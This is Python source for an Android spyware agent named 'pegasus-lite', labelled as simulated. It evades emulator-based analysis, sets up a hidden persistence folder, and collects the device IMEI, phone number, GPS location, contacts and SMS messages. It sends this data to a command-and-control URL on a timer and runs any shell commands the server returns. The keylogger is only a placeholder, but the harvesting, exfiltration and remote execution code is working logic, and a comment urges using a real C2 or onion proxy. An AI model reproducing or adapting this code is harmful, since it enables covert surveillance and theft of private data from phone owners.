# pegasus-lite.py - Mobile Surveillance Agent (Simulated)
# Target: Android 10-13 (via compromised ADB or phishing)
# Author: [REDACTED] | MR. Sabaz ali khan 
# DO NOT UPLOAD TO VIRUSTOTAL — HIGH FALSE POSITIVE RISK

import os
import sys
import time
import base64
import subprocess
import requests
import json
from threading import Thread
from android.permissions import request_permissions, Permission
from jnius import autoclass

# === CONFIGURATION ===
C2_SERVER = "https://pastebin.com/raw/EXAMPLE_C2"  # Use real C2 domain or onion proxy
EXFIL_INTERVAL = 300  # 5 minutes
PERSISTENCE_PATH = "/data/data/com.android.system/files/.pegasus/"
KEYLOGGER_ENABLED = True

# Bypass emulator detection
def is_emulator():
    props = {
        'ro.product.model': 'sdk_google',
        'ro.hardware': 'ranchu',
        'ro.kernel.qemu': '1'
    }
    for key, val in props.items():
        try:
            result = subprocess.check_output(f"getprop {key}", shell=True).decode()
            if val.lower() in result.lower():
                return True
        except:
            pass
    return False

# Create stealth persistent directory
def setup_persistence():
    if not os.path.exists(PERSISTENCE_PATH):
        os.makedirs(PERSISTENCE_PATH, exist_ok=True)
    with open(f"{PERSISTENCE_PATH}config.json", "w") as f:
        json.dump({"active": True, "version": "6.9"}, f)

# Exfiltrate device data
def gather_data():
    Context = autoclass('android.content.Context')
    TelephonyManager = autoclass('android.telephony.TelephonyManager')
    activity = autoclass('org.kivy.android.PythonActivity').mActivity

    tm = activity.getSystemService(Context.TELEPHONY_SERVICE)
    data = {
        "imei": tm.getDeviceId() if hasattr(tm, 'getDeviceId') else "N/A",
        "number": tm.getLine1Number(),
        "model": subprocess.check_output("getprop ro.product.model", shell=True).decode().strip(),
        "os_version": subprocess.check_output("getprop ro.build.version.release", shell=True).decode().strip(),
        "location": get_gps_coords(),  # Requires ACCESS_FINE_LOCATION
        "contacts": get_contacts(),
        "sms_inbox": get_sms(),
        "timestamp": int(time.time())
    }
    return data

def get_gps_coords():
    try:
        LocationManager = autoclass('android.location.LocationManager')
        lm = activity.getSystemService(Context.LOCATION_SERVICE)
        loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
        if loc:
            return {"lat": loc.getLatitude(), "lon": loc.getLongitude()}
        return None
    except:
        return None

def get_contacts():
    # Read contacts via ContentResolver
    cursor = activity.getContentResolver().query(
        autoclass('android.provider.ContactsContract$Contacts').CONTENT_URI,
        None, None, None, None
    )
    contacts = []
    while cursor.moveToNext():
        name = cursor.getString(cursor.getColumnIndex("DISPLAY_NAME"))
        contacts.append(name)
    cursor.close()
    return contacts[:50]  # Limit size

def get_sms():
    sms_uri = autoclass('android.provider.Telephony$Sms').CONTENT_URI
    cursor = activity.getContentResolver().query(sms_uri, None, None, None, None)
    messages = []
    while cursor.moveToNext():
        msg = {
            "address": cursor.getString(cursor.getColumnIndex("ADDRESS")),
            "body": cursor.getString(cursor.getColumnIndex("BODY")),
            "date": cursor.getLong(cursor.getColumnIndex("DATE"))
        }
        messages.append(msg)
    cursor.close()
    return messages[-10:]  # Last 10 SMS

# Keylogger simulation (requires accessibility service)
def start_keylogger():
    if not KEYLOGGER_ENABLED:
        return
    def log_keys():
        while True:
            try:
                # Simulated input capture (real version hooks InputMethodManager)
                with open(f"{PERSISTENCE_PATH}keys.log", "a") as f:
                    f.write(f"[{time.time()}] KEY_EVENT_CAPTURED\n")
            except:
                pass
            time.sleep(10)
    Thread(target=log_keys, daemon=True).start()

# Connect to C2 server
def beacon():
    while True:
        try:
            data = gather_data()
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36'}
            resp = requests.post(C2_SERVER, json=data, headers=headers, timeout=10)
            if resp.status_code == 200:
                cmd = resp.json().get("cmd")
                if cmd:
                    execute_command(cmd)
        except Exception as e:
            print(f"[!] Beacon failed: {str(e)}")
        time.sleep(EXFIL_INTERVAL)

def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        requests.post(C2_SERVER, json={"output": base64.b64encode(output).decode()})
    except Exception as e:
        requests.post(C2_SERVER, json={"error": str(e)})

# Main execution
if __name__ == "__main__":
    if is_emulator():
        sys.exit(0)  # Avoid analysis
    request_permissions([Permission.READ_SMS, Permission.ACCESS_FINE_LOCATION, Permission.READ_CONTACTS])
    setup_persistence()
    start_keylogger()
    Thread(target=beacon, daemon=True).start()
    while True:
        time.sleep(60)  # Keep alive